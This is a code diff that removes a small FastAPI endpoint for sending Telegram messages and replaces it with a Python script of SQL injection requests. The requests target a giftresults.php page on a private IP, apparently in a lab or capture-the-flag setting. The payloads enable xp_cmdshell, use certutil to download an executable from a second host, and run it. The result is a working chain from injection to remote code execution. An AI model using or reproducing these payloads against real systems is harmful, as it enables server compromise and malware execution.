@@ -1,26 +1,6 @@
-from fastapi import FastAPI
-from fastapi.responses import JSONResponse, RedirectResponse
-from pydantic import BaseModel
-
-from utils import tg_api
-
-app = FastAPI()
+import requests
 
 
-class Message(BaseModel):
-    phone: str
-    message: str
-    name: str | None = ""
-
-
-@app.get("/")
-async def root():
-    return RedirectResponse("/docs")
-
-
-@app.post("/sendMessage/")
-async def send_message(msg: Message):
-    sent = await tg_api.send_message(msg.phone, msg.message, msg.name or "Telegram User")
-    if sent:
-        return JSONResponse({"msg": "Successfully sent"}, status_code=200)
-    return JSONResponse({"msg": "Number not found"}, status_code=406)
+requests.get("http://10.10.35.73/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --")
+requests.get("http://10.10.35.73/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.17.119.81:8000/meverse.exe C:\Windows\Temp\meverse.exe'; --")
+requests.get("http://10.10.35.73/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\meverse.exe'; --")
